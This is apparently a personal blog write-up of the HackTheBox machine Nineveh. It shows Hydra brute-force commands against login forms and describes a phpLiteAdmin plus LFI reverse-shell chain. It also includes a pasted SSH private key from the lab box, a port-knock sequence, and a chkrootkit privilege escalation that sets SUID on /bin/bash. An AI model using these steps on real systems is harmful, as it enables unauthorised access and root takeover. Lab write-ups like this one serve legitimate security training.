---
title: "Nineveh"
date: 2023-06-26T12:51:31+02:00
tags: ["linux","lfi"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Nineveh.png
description: "This write-up will be about the HackTheBox machine called Nineveh. "
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "A linux room that " 
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Nineveh
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Nineveh

![Untitled](/HTB/Nineveh.png)

## Tools Used

- Nmap
- Searchsploit
- Hydra
- Knock 

## Port Scanning

Other room, other port scan.

```bash
 nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oN escaneo 
```
![Untitled](/HTB/nmap-nineveh.png)

I found only 1 open port. Let’s focus on it.

## Enumeration

First I saw is that there are two url's one with https and one other with http. I found two diferent login page
one on each url.

![Untitled](/HTB/gobuster-nineveh.png)


## Exploiting

After trying some basic SQL injections and some basic names I decided to brute force with Hydra. With the following commands:
```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /db/index.php:"password=^PASS^&proc_login=^USER^:Incorrect password."
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /department/login.php:"password=^PASS^&proc_login=^USER^:Invalid password."
```

![Untitled](/HTB/db_nineveh.png)

![Untitled](/HTB/hydra_nineveh.png)

When I logged into both I got these interfaces:

![Untitled](/HTB/login-nineveh.png)

![Untitled](/HTB/dbcreate-nineveh.png)

In the page of department, I saw that in **notes** menu the url changes to something so strange. So as always I tried
to find LFI and surprise there is jeje.

![Untitled](/HTB/lfi-nineveh.png)

Once I discovered this I will go to make an oo on the other website. The name of phpLiteAdimn was strange to me since it 
also had a version, so I looked it up in searchsploit and found that there were several vulnerabilities, one of them that 
matched my version said like this: if I manage to create a database and save it in .php, it should be stored with the rest 
in /var/temp/... and I create a table with a single box and enter a code in PHP (reverse shell), then I can access from 
the other page because of the LFI vuln and execute the php command.

![Untitled](/HTB/searchsploit-nineveh.png)

![Untitled](/HTB/dbcreate-nineveh.png)

And suprise we can controle terminal with that so let's do a reverse shell and ...

![Untitled](/HTB/bash-nineveh.png)

![Untitled](/HTB/pwnd-nineveh.png)

The machine is pawned !!

## Gaining an Initial Foothold

I try to do `sudo -l` but no works...

Searching I found the id_rsa of user ambrois

```ruby
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

Next, I found the knockd.conf file in /etc. Reading it:

![Untitled](/HTB/knock-nineveh.png)

So if I do this sequence:
```bash
 knock nineveh.htb 571 290 911
```
I can open ssh port and connect by id_rsa that I found before ...

```bash
 ssh -i id_rsa ambrois@10.10.10.43
```
So I'm now ambrois ...

Next I use **procmon.sh** program to list al process that are running on sistem,
and I saw one called **chkrootkit**, and searching for it I learn that this program
opens the arhive **/temp/update**, so I can create a file called update with this:

```bash
 #!/bin/sh
 chmod +s /bin/bash
```
and then execute `bash -p` and I'm root!! 


The procmon.sh ->
```bash
 #!/bin/bash

old_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')

while true; do
        new_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>]" | grep -vE "procmon|awk|kworker"
        old_process=$new_process
done
```
## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about lfi, hydra, port knocking and chrootkit.
    
- Were there any novel tools or techniques employed?
    
    The use of hydra I think.
